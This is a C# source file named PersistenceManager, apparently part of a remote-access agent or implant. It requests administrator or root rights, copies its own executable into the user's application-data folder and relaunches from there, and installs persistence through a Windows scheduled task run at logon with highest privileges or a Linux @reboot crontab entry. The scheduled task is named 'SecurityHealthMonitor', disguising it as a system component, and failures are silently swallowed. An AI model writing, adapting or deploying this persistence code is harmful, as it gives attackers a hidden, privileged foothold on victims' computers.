using System.Diagnostics;
using System.Runtime.InteropServices;

namespace LibraNextgen.Agent.Core;

public static class PersistenceManager
{
    public static void Apply()
    {
        if (BuildDefaults.RequireAdmin)
            EnsureAdmin();

        if (!string.IsNullOrEmpty(BuildDefaults.CopyToPath))
            CopyAndRelaunch(BuildDefaults.CopyToPath);

        if (BuildDefaults.EnablePersistence)
            InstallPersistence();
    }

    private static void EnsureAdmin()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            if (IsWindowsAdmin()) return;

            var exe = Environment.ProcessPath ?? "";
            var psi = new ProcessStartInfo(exe)
            {
                UseShellExecute = true,
                Verb = "runas"
            };

            try { Process.Start(psi); }
            catch { /* user declined elevation */ }

            Environment.Exit(0);
        }
        else
        {
            if (Environment.UserName == "root") return;
            Console.WriteLine("[!] Must run as root. Exiting.");
            Environment.Exit(1);
        }
    }

    private static void CopyAndRelaunch(string relativePath)
    {
        var currentExe = Environment.ProcessPath ?? "";
        var currentDir = Path.GetDirectoryName(currentExe) ?? "";

        string targetDir;
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            targetDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                relativePath);
        }
        else
        {
            targetDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                relativePath);
        }

        // Normalize — already running from target location
        if (string.Equals(
            Path.GetFullPath(currentDir).TrimEnd(Path.DirectorySeparatorChar),
            Path.GetFullPath(targetDir).TrimEnd(Path.DirectorySeparatorChar),
            StringComparison.OrdinalIgnoreCase))
        {
            return;
        }

        try
        {
            Directory.CreateDirectory(targetDir);
            var targetExe = Path.Combine(targetDir, Path.GetFileName(currentExe));
            File.Copy(currentExe, targetExe, true);
            Process.Start(targetExe);
        }
        catch { /* best effort */ }

        Environment.Exit(0);
    }

    private static void InstallPersistence()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            InstallWindowsScheduledTask();
        else
            InstallLinuxCron();
    }

    private static void InstallWindowsScheduledTask()
    {
        var exe = Environment.ProcessPath ?? "";
        var taskName = "SecurityHealthMonitor";
        var escapedExe = exe.Replace("\"", "\\\"");

        var psi = new ProcessStartInfo("schtasks.exe",
            $"/create /tn \"{taskName}\" /tr \"\\\"{escapedExe}\\\"\" /sc onlogon /rl highest /f")
        {
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        try
        {
            using var p = Process.Start(psi);
            p?.WaitForExit(10_000);
        }
        catch { /* no schtasks available */ }
    }

    private static void InstallLinuxCron()
    {
        var exe = Environment.ProcessPath ?? "";
        var cronLine = $"@reboot {exe} >/dev/null 2>&1";

        try
        {
            var psi = new ProcessStartInfo("bash", $"-c \"(crontab -l 2>/dev/null; echo '{cronLine}') | crontab -\"")
            {
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var p = Process.Start(psi);
            p?.WaitForExit(5_000);
        }
        catch { /* crontab not available */ }
    }

    private static bool IsWindowsAdmin()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return true;

        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }
}
